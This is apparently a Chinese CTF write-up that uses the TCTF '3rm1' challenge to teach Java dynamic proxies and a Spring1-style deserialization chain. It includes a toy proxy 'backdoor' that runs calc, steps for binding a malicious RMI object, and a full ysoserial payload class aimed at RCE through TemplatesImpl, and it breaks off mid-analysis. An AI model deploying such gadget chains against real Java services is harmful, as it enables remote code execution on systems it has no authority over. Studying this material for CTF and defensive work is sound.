<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="f8abc5b479e071382ddfa92d204dc972">从TCTF的3rm1学习java动态代理</h1>
<h2 data-content="1" id="688fa02137b5f2255ea2b45838acbb5f">关于java代理</h2>
<blockquote>
<p>代理模式是常用的 java 设计模式，他的特征是代理类与委托类有同样的接口，代理类主要负责为委托类预处理消息、过滤消息、把消息转发给委托类，以及事后处理消息等。代理类与委托类之间通常会存在关联关系，一个代理类的对象与一个委托类的对象关联，代理类的对象本身并不真正实现服务，而是通过调用委托类的对象的相关方法，来提供特定的服务。</p>
</blockquote>
<p>这里需要关注的重点有如下几点</p>
<ul>
<li>代理类与委托类有同样的接口</li>
<li>代理类主要负责为委托类预处理消息、过滤消息等简而言之经过代理的类方法被调用后会先经过代理类的处理。</li>
<li>一个代理类的对象与一个委托类的对象关联</li>
</ul>
<p>从这里你能够发现其实实现代理模式需要三个东西：一个公共接口，一个具体的类，一个代理类,代理类持有具体类的实例，代为执行具体类实例方法。</p>
<p>下面是最常见的两种代理模式</p>
<h3 data-content="1" id="939af54677e5bca5bc13ddec2fe624e3">静态代理</h3>
<p>这种代理方式需要代理对象和目标对象实现一样的接口。但是当需要代理的对象过多就需要实现大量的代理类，并且一旦接口增加方法，目标对象与代理对象都要进行修改。</p>
<p>举个例子学生交作业，一般都是通过学生先交给课代表然后课代表交给老师这种模式，课代表在这里就相当于是一个学生代理类。</p>
<p>首先你需要一个公共代理接口,这个接口就是学生（被代理类），和课代表（代理类）的公共接口</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">interface</span> <span class="nc">Event</span> <span class="o">{</span>
    <span class="kt">void</span> <span class="nf">SubmitWork</span><span class="o">();</span>
<span class="o">}</span>
</pre></div>
<p>然后你需要一个学生类,这是被代理类。</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Student</span> <span class="kd">implements</span> <span class="n">Event</span><span class="o">{</span>
    <span class="n">String</span> <span class="n">name</span><span class="o">;</span>

    <span class="kd">public</span> <span class="nf">Student</span><span class="o">(</span><span class="n">String</span> <span class="n">n</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">n</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">SubmitWork</span><span class="o">()</span> <span class="o">{</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">+</span> <span class="s">"提交作业"</span><span class="o">);</span>
    <span class="o">}</span>

<span class="o">}</span>
</pre></div>
<p>最后你需要一个代理类</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">test</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">StudentInnovation</span> <span class="kd">implements</span> <span class="n">Event</span><span class="o">{</span>
    <span class="n">Student</span> <span class="n">student</span><span class="o">;</span>
    <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="c1">//收到的作业数量</span>

    <span class="kd">public</span> <span class="nf">StudentInnovation</span><span class="o">(</span><span class="n">Student</span> <span class="n">stu</span><span class="o">){</span>
        <span class="c1">// 只代理学生对象</span>
        <span class="k">if</span><span class="o">(</span><span class="n">stu</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">==</span> <span class="n">Student</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">student</span> <span class="o">=</span> <span class="o">(</span><span class="n">Student</span><span class="o">)</span><span class="n">stu</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setStudent</span><span class="o">(</span><span class="n">Student</span> <span class="n">student</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">student</span> <span class="o">=</span> <span class="n">student</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">SubmitWork</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">student</span><span class="o">.</span><span class="na">SubmitWork</span><span class="o">();</span>
        <span class="k">this</span><span class="o">.</span><span class="na">count</span> <span class="o">+=</span> <span class="mi">1</span><span class="o">;</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"已收作业数量为"</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">count</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>有了这三样东西你就能实现一个简单的代理。简单测试一下。</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">test</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">main</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">//被代理的学生张三，他的作业提交由代理对象monitor（课代表）完成</span>
        <span class="n">Student</span> <span class="n">s1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Student</span><span class="o">(</span><span class="s">"张三"</span><span class="o">);</span>
        <span class="n">Student</span> <span class="n">s2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Student</span><span class="o">(</span><span class="s">"李四"</span><span class="o">);</span>
        <span class="n">Student</span> <span class="n">s3</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Student</span><span class="o">(</span><span class="s">"王五"</span><span class="o">);</span>
        <span class="c1">//生成代理对象，并将张三传给代理对象</span>
        <span class="n">StudentInnovation</span> <span class="n">monitor</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StudentInnovation</span><span class="o">(</span><span class="n">s1</span><span class="o">);</span>
        <span class="c1">//向课代表提交作业</span>
        <span class="n">monitor</span><span class="o">.</span><span class="na">SubmitWork</span><span class="o">();</span>
        <span class="n">monitor</span><span class="o">.</span><span class="na">setStudent</span><span class="o">(</span><span class="n">s2</span><span class="o">);</span>
        <span class="n">monitor</span><span class="o">.</span><span class="na">SubmitWork</span><span class="o">();</span>
        <span class="n">monitor</span><span class="o">.</span><span class="na">setStudent</span><span class="o">(</span><span class="n">s3</span><span class="o">);</span>
        <span class="n">monitor</span><span class="o">.</span><span class="na">SubmitWork</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220646-3b3492ba-6c01-1.png"/></p>
<p>但是你能很明显的感受这样的模式完成代理一个类是很容易的，但如果需要代理的类很多，那么就需要编写大量的代理类，比较繁琐。并且当接口被改变代理类同样需要改变，这样就产生了更大的局限性和更多麻烦。这就需要动态代理来解决问题了。</p>
<h3 data-content="1" id="8f0861088a4928e7e3ac672fddda676b">动态代理</h3>
<p>动态代理和静态代理一样也需要三样东西：公共接口，代理对象，代理类。区别就是动态代理是利用反射机制在运行时创建代理类。</p>
<p>例如这里代理对象类的接口类不变，代理类这样实现。这里使用了jdk原生自带的<code>InvocationHandler</code>，这个类也是文章后面会重点使用到的利用类。这样写就不再局限于一种接口了。</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">test</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ProxyHandler</span> <span class="kd">implements</span> <span class="n">InvocationHandler</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="n">Object</span> <span class="n">object</span><span class="o">;</span>
    <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="c1">//收到的作业数量</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setStudent</span><span class="o">(</span><span class="n">Student</span> <span class="n">student</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">object</span> <span class="o">=</span> <span class="n">student</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="nf">ProxyHandler</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">){</span>
        <span class="k">this</span><span class="o">.</span><span class="na">object</span> <span class="o">=</span> <span class="n">object</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Object</span> <span class="n">proxy</span><span class="o">,</span> <span class="n">Method</span> <span class="n">method</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
        <span class="n">method</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">object</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">count</span> <span class="o">+=</span> <span class="mi">1</span><span class="o">;</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"已收作业数量为"</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">count</span><span class="o">);</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>进行测试</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">main</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">//被代理的学生张三，他的作业提交由代理对象monitor（课代表）完成</span>
        <span class="n">Student</span> <span class="n">s1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Student</span><span class="o">(</span><span class="s">"张三"</span><span class="o">);</span>
        <span class="n">InvocationHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProxyHandler</span><span class="o">(</span><span class="n">s1</span><span class="o">);</span>
        <span class="n">Event</span> <span class="n">proxyHello</span> <span class="o">=</span> <span class="o">(</span><span class="n">Event</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">s1</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getClassLoader</span><span class="o">(),</span> <span class="n">s1</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getInterfaces</span><span class="o">(),</span> <span class="n">handler</span><span class="o">);</span>
        <span class="n">proxyHello</span><span class="o">.</span><span class="na">SubmitWork</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220657-41bdf7e8-6c01-1.png"/></p>
<h3 data-content="1" id="079090016ebd8189102ed933ef51fb83">动态代理简单利用</h3>
<p>而有了代理如何进行利用呢，这里简单搭建一个攻击场景。</p>
<p>首先有两个公共接口</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">test</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">interface</span> <span class="nc">Teacher</span> <span class="o">{</span>
    <span class="n">Object</span> <span class="nf">getObject</span><span class="o">();</span>
    <span class="kt">void</span> <span class="nf">attack</span><span class="o">();</span>
<span class="o">}</span>
</pre></div>
<p>有一个实现公共接口的类A和一个后门类</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">test</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">A</span> <span class="kd">implements</span> <span class="n">Teacher</span><span class="o">{</span>
    <span class="n">Object</span> <span class="n">object</span><span class="o">;</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getObject</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">attack</span><span class="o">()</span> <span class="o">{</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"attack"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>有一个后门类,例如这样。</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">test</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Backdoor</span> <span class="kd">implements</span> <span class="n">Teacher</span><span class="o">{</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getObject</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">attack</span><span class="o">()</span>  <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"calc"</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>有一个可利用的代理类myProxy</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">myProxy</span> <span class="kd">implements</span> <span class="n">InvocationHandler</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="n">Object</span> <span class="n">object</span><span class="o">;</span>

    <span class="kd">public</span> <span class="nf">myProxy</span><span class="o">(</span><span class="n">Object</span> <span class="n">o</span><span class="o">){</span>
        <span class="k">this</span><span class="o">.</span><span class="na">object</span> <span class="o">=</span> <span class="n">o</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Object</span> <span class="n">proxy</span><span class="o">,</span> <span class="n">Method</span> <span class="n">method</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">object</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>有一个代理类</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">test</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ProxyHandler</span> <span class="kd">implements</span> <span class="n">InvocationHandler</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="n">A</span> <span class="n">object</span><span class="o">;</span>
    <span class="kd">public</span> <span class="nf">ProxyHandler</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">){</span>
        <span class="k">this</span><span class="o">.</span><span class="na">object</span> <span class="o">=</span> <span class="o">(</span><span class="n">A</span><span class="o">)</span> <span class="n">object</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Object</span> <span class="n">proxy</span><span class="o">,</span> <span class="n">Method</span> <span class="n">method</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"method is "</span> <span class="o">+</span> <span class="n">method</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
        <span class="n">method</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">object</span><span class="o">.</span><span class="na">getObject</span><span class="o">(),</span> <span class="n">args</span><span class="o">);</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>很明显我们最终的目的是需要调用到后门类里面的attack方法。这里我们能够控制<code>ProxyHandler.invoke()</code>中的method为attack方法名，因为Teacher接口里面也有attack方法。</p>
<p>所以关键就是让<code>this.object.getObject()</code>能够返回一个Backdoor后门类实例对象就能完成attack方法调用。所以怎么做呢这里的通常做法就是能够寻找到一个新的代理，我们能够控制这个代理的invoke返回对象，然后用它来代理ProxyHandler中的object，当调用到<code>this.object.getObject()</code>进入到我们找的可利用的代理对象中控制返回对象为一个Backdoor后门类实例。所以很明显这里的<code>myProxy</code>就是那个新的代理。</p>
<p>最终的利用代码如下</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">main</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NoSuchFieldException</span><span class="o">,</span> <span class="n">IllegalAccessException</span> <span class="o">{</span>
        <span class="n">A</span> <span class="n">t</span> <span class="o">=</span> <span class="k">new</span> <span class="n">A</span><span class="o">();</span>
        <span class="n">Backdoor</span> <span class="n">backdoor</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Backdoor</span><span class="o">();</span>
        <span class="n">InvocationHandler</span> <span class="n">backdoorhandler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">myProxy</span><span class="o">(</span><span class="n">backdoor</span><span class="o">);</span>
        <span class="n">Teacher</span> <span class="n">proxyInstance</span> <span class="o">=</span> <span class="o">(</span><span class="n">Teacher</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">backdoor</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getClassLoader</span><span class="o">(),</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Teacher</span><span class="o">.</span><span class="na">class</span><span class="o">},</span> <span class="n">backdoorhandler</span><span class="o">);</span>

        <span class="n">InvocationHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProxyHandler</span><span class="o">(</span><span class="n">t</span><span class="o">);</span>
        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">handler</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"object"</span><span class="o">);</span>
        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">handler</span><span class="o">,</span><span class="n">proxyInstance</span><span class="o">);</span>
        <span class="n">Teacher</span> <span class="n">proxyHello</span> <span class="o">=</span> <span class="o">(</span><span class="n">Teacher</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">t</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getClassLoader</span><span class="o">(),</span> <span class="n">t</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getInterfaces</span><span class="o">(),</span> <span class="n">handler</span><span class="o">);</span>
        <span class="n">proxyHello</span><span class="o">.</span><span class="na">attack</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220707-47e74a5c-6c01-1.png"/></p>
<h2 data-content="1" id="ee511001499b86913d910f1d60ff6c7d">关于题目</h2>
<p>此题最终是4解，最终的做法也是将java动态代理运用的很巧妙，很有趣的一道题。</p>
<p>题目描述和提示</p>
<blockquote>
<p>The server resets every 5 minutes<br/>
hint 1: <a href="https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf" target="_blank">https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf</a> page 50<br/>
hint 2: <a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Spring1.java" target="_blank">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Spring1.java</a></p>
</blockquote>
<p>题目给了一个rmi服务，但是题目的远程服务端绑定死了，所以即使控制了lookup的参数也无法进行jndi。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220718-4e7cc2c0-6c01-1.png"/></p>
<p>但是如果能够在rmi服务端绑定我们的恶意对象，然后恶意对象的地址只想我们的恶意服务（例如jrmp listener），然后在注册端lookup这个对象然后会在我们的恶意服务端返回序列化好的数据让题目客户端反序列化即可进行rce。</p>
<p>题目给的两个hint很明显契合了这个做法，第一个hint用来绕过高版本jdk限制除本地服务外的其它连接来注册对象。第二个hint用来完成进行rce的反序列化链。</p>
<h2 data-content="1" id="1cdbb58fb384a2e9b8d17ce7336e6fac">注册恶意对象</h2>
<p>工具一把梭<a href="https://github.com/qtc-de/remote-method-guesser" target="_blank">https://github.com/qtc-de/remote-method-guesser</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220724-520ea232-6c01-1.png"/></p>
<p>绑定之后，起一个JRMPListener服务使用URLDNS的链子，然后请求我们注册的恶意对象，可以看到题目客户端成功将URLDNS的链子反序列化，很明显此做法是可行的，所以剩下需要做的就是找出找出一条链子进行rce。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220730-55cdb610-6c01-1.png"/></p>
<h2 data-content="1" id="d28bc65bbc6f444313053c5a671701db">反序列化链的尝试</h2>
<p>这个是这个题目的难点，题目给的提示是spring1的链子，所以必然需要先了解这条链子。</p>
<h3 data-content="1" id="6ee73e65289f5e1bd918d486557f75ae">关于spring1</h3>
<p>这条链子在JDK 8u66之前是可以使用的。</p>
<p>链子调用如下图，最终利用TemplatesImpl.newTransformer()来实例化恶意字节码，链子主要靠的是使用InvocationHandler层层代理。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220735-58c4e50a-6c01-1.png"/></p>
<p>使用ysoserial项目调试。程序反序列化的入口为<code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220740-5bafc514-6c01-1.png"/></p>
<p>此时可以看到总共是有三层代理的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220810-6d28a2ac-6c01-1.png"/></p>
<p>在<code>this.provider.getType().getClass()</code>存在第一层代理，在invoke里会返回一个<code>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code>代理，这个代理的invoke是最终执行命令的方法。</p>
<p>从上图也可以看到最后一层代理是代理objectFactory的getObject方法，然后返回一个templates，此时method又被设置为newTransformer，所以就能成功实例化恶意字节码。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220816-70ec3836-6c01-1.png"/></p>
<p>接着往下调试，第一次代理返回就是上面所说的<code>AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220820-73ab6952-6c01-1.png"/></p>
<p>然后在<code>ReflectionUtils.findMethod</code>中会获取到newTransformer方法，因为代理类实例化时传入了接口。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220827-776e8fa6-6c01-1.png"/></p>
<p>然后还会调用一次getType，调用过程和第一次是一样的返回对象也是一样的，都是返回了一个代理对象。<br/>
重要的是在调用<code>ReflectionUtils.invokeMethod</code>时，可以看到此时的method已经被代理</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220832-7a68cf6e-6c01-1.png"/></p>
<p>所以会再次跳转到代理类的invoke，这里就是我们最终能够成功调用templates的newtransformer的地方。可以看到这里调用到了getObject方法，但是objectFactory已经被代理所以这里的getObject方法返回的类也可以被控制，让其返回一个templatesImpl实例对象即可。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220838-7e163340-6c01-1.png"/></p>
<p>进入到getObject代理中，看到从HashMap中取出来templatesImpl实例对象<br/>
。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220842-8040eaca-6c01-1.png"/></p>
<p>后面就是经典的利用templatesImpl实例化恶意字节码来进行rce的做法了。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220846-82cfdda0-6c01-1.png"/></p>
<h3 data-content="1" id="2c140f3bd9d7845a2d9809a0a3598a51">回到题目，比赛时错误的做法。</h3>
<p>说是错误做法就是没有注意到题目jdk版本导致写出来的链子有个类在jdk202下被更改过了导致无法使用，不过还是值得记录一下。</p>
<p>题目的readObject入口是这样的，和spring1的链子对比一下，可以看到几乎一摸一样。这里的<code>getGirlFriend</code>就相当于时<code>getType</code>方法</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220852-86492c7a-6c01-1.png"/></p>
<p>同时看到题目提供的一些接口，几乎和spring1如出一辙，区别就是这些都是出题者自己实现的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220856-88b1087a-6c01-1.png"/></p>
<p>但是相比于spring1还差一个可以最终rce的反射调用方法。再看代码发现出题者实现了<code>MyInvocationHandler</code>，所以很明显需要用的都提供了剩下的就是改改实例化类的名字了。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220903-8d132272-6c01-1.png"/></p>
<p>exp代码如下</p>
<pre><code>package ysoserial.payloads;

import com.ctf.threermi.*;
import org.springframework.beans.factory.ObjectFactory;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Type;

import static java.lang.Class.forName;

public class TCTF3rmi extends PayloadRunner implements ObjectPayload&lt;Object&gt; {
    public Object getObject(final String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);
        final FactoryInter factoryInter = Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), FactoryInter.class);

        final MyInvocationHandler myInvocationHandler = new MyInvocationHandler();
        Reflections.setFieldValue(myInvocationHandler,"object",factoryInter);
        final Friend friend = Gadgets.createProxy(myInvocationHandler,Friend.class,Templates.class);


        final UserInter userInter = Gadgets.createMemoitizedProxy(
            Gadgets.createMap("getGirlFriend", friend),
            UserInter.class,Templates.class);

        Gadget gadget = new Gadget();
        Reflections.setFieldValue(gadget,"user",userInter);
        Reflections.setFieldValue(gadget,"mName","newTransformer");

        return gadget;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(TCTF3rmi.class, args);
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }

}</code></pre>
<p>但最终是无法打通题目，可以问题出在看到从<code>memberValues</code>中获取到的对象是null。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220911-91ba16c8-6c01-1.png"/></p>
<p>原因在于在最开始已经说到spring1的链子有jdk版本限制，而题目的版本是jdk8u201，高版本下<code>AnnotationInvocationHandler</code>的readObject方法被修改了，无法控制this.memberValues的值了，所以也无法控制invoke的返回对象。下面看看到底在哪被限制了呢。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220916-948c6752-6c01-1.png"/></p>
<p>jdk8u201版本下的<code>AnnotationInvocationHandler</code>如下,最终需要满足判断<code>var12 != null</code>才能获取HashMap中的键值然后put到var7中最后赋值给<code>MemberValues</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220921-97b4fc96-6c01-1.png"/></p>
<p>而<code>memberTypes</code>是从<code>AnnotationType</code>实例化后的对象获取到的，跟进<code>getInstance</code>。可以看到第一个参数指定var1必须是Annotation的子类，第二个参数是传入一个Map类型的var2。将var1赋值给成员变量type然后将var赋值给成员变量memberValues。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221124220926-9aab9a68-6c01-1.png"/></p>
